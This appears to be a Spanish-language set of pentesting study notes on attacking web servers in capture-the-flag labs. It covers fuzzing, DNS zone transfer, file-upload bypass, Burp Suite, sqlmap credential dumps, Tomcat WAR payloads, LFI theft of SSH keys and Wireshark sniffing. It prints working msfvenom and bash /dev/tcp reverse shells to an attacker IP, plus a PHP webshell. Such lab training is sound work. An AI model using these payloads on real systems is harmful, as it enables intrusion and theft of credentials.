---
icon: '4'
---

# Explotación vulnerabilidades Web

## Qué es el Fuzzing Web – Uso de Gobuster

```bash
dirb http://<IP máquina víctima>
```

```bash
gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

## Enumeración de Subdominios con Wfuzz

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Logan" %}

En ocasiones, es necesario editar el archivo `/etc/hosts` para asociar un dominio con la dirección IP de una máquina víctima (o servidor específico). Este archivo actúa como un mapa local de nombres de dominio a direcciones IP, permitiendo que las consultas de dominio se resuelvan localmente sin depender de DNS externos.

```bash
sudo nano /etc/hosts
<IP-de-la-máquina-víctima> <dominio-deseado>
```

#### Búsqueda de subdominios

```bash
wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.logan.hmv" -u <IP máquina víctima> 
```

> **Nota:** también hay que añadir lo que encontremos en el /etc/hosts&#x20;

## Cómo Hacer un Ataque de Transferencia de Zona DNS

{% embed url="https://vulnyx.com/#hunter" %}

Tenemos un dominio y el puerto 53 se puede realizar este ataque&#x20;

```bash
dig axfr <dominio> @<IP máquina víctima>
```

> **Nota**: también hay que añadir lo que encontremos en el /etc/hosts&#x20;

```bash
wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.<dominio>" -u <IP máquina víctima>
```

> **Nota**: también hay que añadir lo que encontremos en el /etc/hosts&#x20;

## Otras Herramientas Fuzzing Web – Uso de WFUZZ, DIRB y DIRSEARCH

{% embed url="https://vulnyx.com/#jenk" %}

```bash
wfuzz -c --hc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://<IP máquina víctima/FUZZ
```

```bash
dirb http://<IP máquina víctima>
```

```bash
dirsearch -u http://<IP máquina víctima>/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

## Explotación de vulnerabilidad File Upload

{% embed url="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141" %}

```bash
msfvenom -p php/reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f raw >pwned.php
```

Tenemos que ver siempre donde se subió por lo que realizamos el comando:

```bash
gobuster dir -u http://<IP máquina víctima>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Nos ponemos en escucha.

```bash
nc -nlvp 443
```

Nos mandamos la Reverse Shell. Por lo que nos ponemos en escucha otra vez.

```bash
nc -nlvp 4444
```

```bash
bash -c "sh -i >& /dev/tcp/<IP máquina atacante/4444 0>&1"
```

## Primeros pasos tras la Intrusión (Tratamiento de la TTY)

Al hacer la Reverse Shell tenemos que hacer los siguientes comandos para trabajar más cómodamente en la máquina víctima.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Obtener Intrusión a Servidor Mediante uso de una Webshell

Una Webshell es un archivo que se sube a un servidor para la ejecución remota de comandos.

```bash
<?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Por lo que se podría hacer ahora.

```bash
http://<IP máquina víctima>/uploads/archivo.php?cmd=whoami
```

Para hacer URL una Reverse Shell en Burpuiste entrar en la opción de Decoder.

```bash
bash -c "bash -i>&/dev/tcp/<IP máquina atacante>/443 0>&1"
```

Tras esto dar a la opción **Encode as URL**.

```bash
http://<IP máquina víctima>/uploads/archivo.php?cmd=<URL encodeada>
```

## Bypass Restricción de File Upload

{% embed url="https://tryhackme.com/room/vulnversity" %}

Cuando no nos dejan subir un archivo en `.php` cambiamos la extensión a .`phtml` ya que a efectos prácticos es lo mismo.

```bash
mv pwned.php pwned.phtml
```

Realizamos fuzzing para ver donde se subió el archivo.

## Burp Suite – Modificar Peticiones HTTP

{% embed url="https://tryhackme.com/room/vulnversity" %}

Vamos a ajustes y configuramos el proxy de esta manera.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Interceptamos la conexión al dar al archivo de la Reverse Shell. Cambiamos la extensión del archivo y le damos a **Forward**. Apagamos la intercepción.

## Burp Suite – Uso del Repeater

El uso del Repeater en Burp Suite es fundamental para realizar pruebas de seguridad en aplicaciones web. Primero interceptas una petición HTTP usando el Intercept y, una vez capturada, puedes enviarla al Repeater. Esto permite modificar parámetros, cabeceras y cualquier parte de la petición, y después reenviarla al servidor para ver su respuesta. Al enviar la petición al Repeater, se abre una ventana donde se puede ver la solicitud completa en formato HTTP. Desde ahí es posible manipular aspectos como la URL, los parámetros, las cabeceras y el cuerpo de la solicitud, lo que facilita la simulación de ataques como inyecciones SQL, XSS o manipulación de parámetros con el objetivo de observar cómo responde el servidor ante cada cambio.

Después de realizar la modificación deseada, solo necesitas hacer clic en "Send" para enviar la petición modificada al servidor. La respuesta se muestra en el panel de la derecha, y allí puedes analizar si la modificación que realizaste produce algún error del servidor, comportamiento anómalo o filtración de información que indique una posible vulnerabilidad. Este proceso se puede repetir cuantas veces sea necesario sin tener que interceptar de nuevo la solicitud original. Además, el Repeater permite crear múltiples pestañas para probar diferentes variaciones de la misma solicitud y comparar los resultados, lo cual es útil para evaluar el impacto de distintas modificaciones en el comportamiento de la aplicación web.

## Burp Suite – Uso del Intruder

El **Intruder** de Burp Suite es una herramienta potente para realizar ataques de diccionario o de fuerza bruta en diferentes partes de las peticiones HTTP, como parámetros, cabeceras o valores específicos de los formularios. Esto es útil en pruebas de fuzzing para encontrar valores vulnerables o detectar fallos de seguridad en la validación de datos de entrada.

Aquí te explico cómo usar el Intruder en Burp Suite para hacer fuzzing con un diccionario:

Primero, intercepta una petición HTTP usando el **Intercept** de Burp Suite. Una vez que tengas la petición que deseas atacar, envíala al **Intruder** seleccionando la opción **Send to Intruder**. Esto te llevará a la ventana de configuración del Intruder, donde podrás configurar los detalles del ataque.

Dentro del panel de Intruder, verás cuatro pestañas importantes:

1. **Positions**: Aquí defines las partes de la petición que quieres atacar o modificar. Burp Suite marcará automáticamente ciertos puntos en la solicitud con caracteres `§`, pero puedes ajustar estos puntos seleccionando el texto específico que deseas modificar y haciendo clic en **Add §** para añadir tu propio delimitador. Puedes elegir los parámetros o campos específicos que deseas modificar con el diccionario.
2. **Payloads**: En esta pestaña se define el tipo de datos que se enviarán a cada posición marcada. Selecciona el tipo de ataque, que puede ser uno simple (donde se prueba una lista de entradas en una posición) o múltiple (para probar varias combinaciones). Luego, elige un diccionario o crea una lista personalizada de valores que deseas enviar al servidor. Por ejemplo, puedes cargar una lista de nombres de usuario o contraseñas para probar en un formulario de inicio de sesión.
3. **Attack Type**: Burp Suite ofrece varios tipos de ataque, siendo los más comunes **Sniper** y **Cluster Bomb**.
   * **Sniper** realiza ataques sobre una sola posición por vez y es útil si quieres probar varios valores en un solo punto de la petición.
   * **Cluster Bomb** es ideal para probar varias posiciones simultáneamente, generando combinaciones de valores para cada punto marcado en la solicitud.
4. **Start Attack**: Cuando hayas configurado las posiciones y el diccionario, haz clic en **Start Attack** para comenzar el fuzzing. Intruder enviará todas las solicitudes, aplicando cada valor del diccionario a las posiciones que seleccionaste, y registrará todas las respuestas. En la interfaz de ataque verás una tabla con los resultados, donde puedes analizar las respuestas de cada solicitud para identificar patrones o respuestas diferentes, como códigos de error, mensajes de acceso, o tiempos de respuesta, que indiquen posibles vulnerabilidades.

## Inyecciones SQL – Uso de SQLmap

{% embed url="https://vulnyx.com/#shop" %}

Conocer las bases de datos.

```bash
sqlmap -u http://<IP máquina víctima> --forms --dbs --batch
```

Conocer las tablas de la base de datos objetivo.

```bash
sqlmap -u http://<IP máquina víctima> --forms -D Webapp --tables --batch
```

Conocer las columnas de la tabla de la bases de datos objetivo.

```bash
sqlmap -u http://<IP máquina víctima> --forms -D Webapp -T Users --columns --batch
```

Conocer la información que hay en esas columnas.

```bash
sqlmap -u http://<IP máquina víctima> --forms -D Webapp -T Users -C username,password --dump --batch
```

## Inyecciones SQL – Uso de SQLmap – EJEMPLO 2

{% embed url="https://dockerlabs.es" %}

```bash
sqlmap -u http://<IP máquina víctima> --forms --dbs --batch
```

```bash
sqlmap -u http://<IP máquina víctima> --forms -D register --tables --batch
```

```bash
sqlmap -u http://<IP máquina víctima> --forms -D register -T users --columns --batch
```

```bash
sqlmap -u http://<IP máquina víctima> --forms -D register -T users -C username,password --dump --batch
```

## Hacking Servidor Tomcat

{% embed url="https://vulnyx.com/#deploy" %}

En esta página encontramos las credenciales más comunes de Tomcat y cómo vulnerar el servidor.

{% embed url="https://book.hacktricks.xyz/es/network-services-pentesting/pentesting-web/tomcat" %}

Dependiendo de la versión del servidor puede funcionar uno u otro.

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f war -o reverse1.war
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f war -o reverse2.war
```

Nos ponemos en escucha y vemos cual funciona.

```bash
nc -nlvp 443
```

## Explotación Vulnerabilidad Local File Inclusion

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly2" %}

La explotación de la vulnerabilidad **Local File Inclusion (LFI)** es una técnica que aprovecha fallos en aplicaciones web para acceder a archivos locales del servidor. En términos sencillos, **LFI** permite a un atacante manipular rutas de archivos para incluir archivos que están almacenados en el servidor, logrando así exponer datos sensibles, código fuente o archivos de configuración que, en condiciones normales, deberían estar protegidos.

LFI ocurre cuando una aplicación web permite la inclusión de archivos locales sin una validación adecuada de las entradas. Esto sucede comúnmente en aplicaciones que aceptan rutas de archivos como parámetros en una URL. Por ejemplo, si una aplicación tiene un parámetro de URL como:

```arduino
http://example.com/index.php?page=home.php
```

Aquí, el valor de `page` se utiliza para cargar un archivo en el servidor (`home.php`). Si no se valida el valor de `page`, un atacante puede modificarlo para intentar cargar otros archivos del sistema. Por ejemplo:

```bash
http://example.com/index.php?page=/etc/passwd
```

El archivo `/etc/passwd` en sistemas Unix/Linux contiene información sobre los usuarios del sistema y, aunque no suele incluir contraseñas en texto claro, su acceso puede dar información importante al atacante.

#### Explotación Básica de LFI

La explotación de LFI se realiza a menudo mediante el uso de **ruta transversal** o **path traversal** (`../../`). Esto permite que el atacante navegue fuera del directorio de la aplicación y acceda a otras áreas del sistema de archivos. Ejemplo:

```bash
http://example.com/index.php?page=../../../../etc/passwd
```

#### Explotación de LFI para Acceder al Archivo `id_rsa`

1. **Identificar la Vulnerabilidad LFI:**
   *   Usualmente, un parámetro en la URL, como `page`, `file`, `doc`, o similar, se utiliza para incluir archivos en el servidor. Por ejemplo:

       ```arduino
       http://example.com/index.php?page=home.php
       ```
   * Si el parámetro no valida correctamente la entrada, puede ser posible manipularlo para navegar a directorios fuera del alcance de la aplicación mediante **ruta transversal**.
2.  **Pruebas de Ruta Transversal para Acceso a `id_rsa`:**

    * La clave privada SSH de un usuario en Linux suele estar en el directorio `~/.ssh/id_rsa`.
    *   Puedes probar la siguiente solicitud LFI para intentar acceder a este archivo:

        ```bash
        http://example.com/index.php?page=../../../../home/username/.ssh/id_rsa
        ```

    > **Nota:** El número de `../` (directorios hacia arriba) depende de la ubicación relativa del archivo PHP en el sistema. Puedes necesitar probar diferentes combinaciones.
3. **Evaluar la Respuesta:**
   * Si el servidor no tiene protecciones adecuadas y la vulnerabilidad está presente, deberías ver el contenido del archivo `id_rsa` en la respuesta. Este contenido es la clave privada en texto, que típicamente empieza con `-----BEGIN RSA PRIVATE KEY-----` y termina con `-----END RSA PRIVATE KEY-----`.
   * Copia cuidadosamente todo el contenido si aparece en la respuesta.
4. **Utilizar la Clave Privada (id\_rsa):**
   * Si el atacante consigue el archivo `id_rsa`, puede intentar utilizarlo para acceder al servidor vía SSH.
   *   Para hacerlo, el archivo debe tener permisos restringidos. Guárdalo en tu máquina local y cambia los permisos a `600`:

       ```bash
       chmod 600 id_rsa
       ```
   *   Luego, intenta conectarte al servidor con el comando SSH:

       <pre class="language-bash"><code class="lang-bash"><strong>ssh -i id_rsa username@target_server
       </strong></code></pre>

Como nos pide una contraseña del archivo `id_rsa` hay que usar por tanto **John**.

```bash
ssh2john id_rsa > hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## Uso de Wireshark para Interceptar Credenciales de Protocolos Vulnerables

Wireshark es una herramienta de análisis de red que permite interceptar y analizar el tráfico de red en tiempo real. Como **sniffer**, Wireshark captura paquetes de datos que se transmiten a través de la red, y es especialmente útil para auditar y descubrir vulnerabilidades en los protocolos de comunicación. Cuando se utilizan protocolos no seguros o vulnerables, como **HTTP, FTP, Telnet o POP3**, es posible interceptar credenciales y otros datos sensibles, ya que estos protocolos transmiten información en texto plano.

1. **Configuración de Wireshark y Captura de Tráfico:**
   * Inicia Wireshark y selecciona la interfaz de red en la que deseas capturar tráfico (por ejemplo, Wi-Fi o Ethernet).
   * Haz clic en **Start** para comenzar a capturar el tráfico.
   * Asegúrate de estar conectado en la misma red que la máquina objetivo, especialmente en redes locales donde los protocolos no seguros son más comunes.
2. **Filtros de Captura para Protocolos Vulnerables:**
   * Puedes aplicar filtros en Wireshark para reducir la captura y enfocarte en protocolos específicos.
   * Para interceptar credenciales, usa filtros como:
     * **HTTP**: `http`
     * **FTP**: `ftp`
     * **Telnet**: `telnet`
     * **POP3**: `pop`
     * **IMAP**: `imap`
   * Al aplicar estos filtros, Wireshark solo mostrará paquetes relacionados con el protocolo seleccionado, facilitando la búsqueda de datos específicos.
3. **Análisis de Paquetes y Extracción de Credenciales:**
   * Para protocolos no seguros, las credenciales suelen transmitirse en texto plano. Aquí te explico cómo identificar credenciales en algunos protocolos vulnerables:
     * **HTTP**: Busca paquetes de tipo `POST` en formularios de autenticación. Al revisar los paquetes `POST`, podrás ver los parámetros enviados, como `username` y `password`.
     * **FTP**: Busca las palabras `USER` y `PASS` en los paquetes FTP. Estos indican el nombre de usuario y la contraseña enviados al servidor.
     * **Telnet**: Este protocolo envía comandos en texto plano. Al observar las primeras líneas de comunicación, se pueden ver las credenciales de inicio de sesión.
     * **POP3 e IMAP**: En estos protocolos de correo, los comandos `USER` y `PASS` también suelen aparecer en los paquetes, indicando las credenciales de acceso a la cuenta de correo.
4. **Ejemplo de Análisis: Interceptación en HTTP**
   * Digamos que estás capturando tráfico HTTP. Filtra el tráfico con `http` y revisa los paquetes `POST` o `GET` que contienen parámetros de autenticación.
   * Selecciona un paquete HTTP y, en la parte inferior de la interfaz de Wireshark, verás la sección **Packet Details**, donde podrás expandir las capas de `Hypertext Transfer Protocol`.
   * Al examinar los datos en texto claro, podrás ver los parámetros enviados, como `username=johndoe` y `password=12345`.
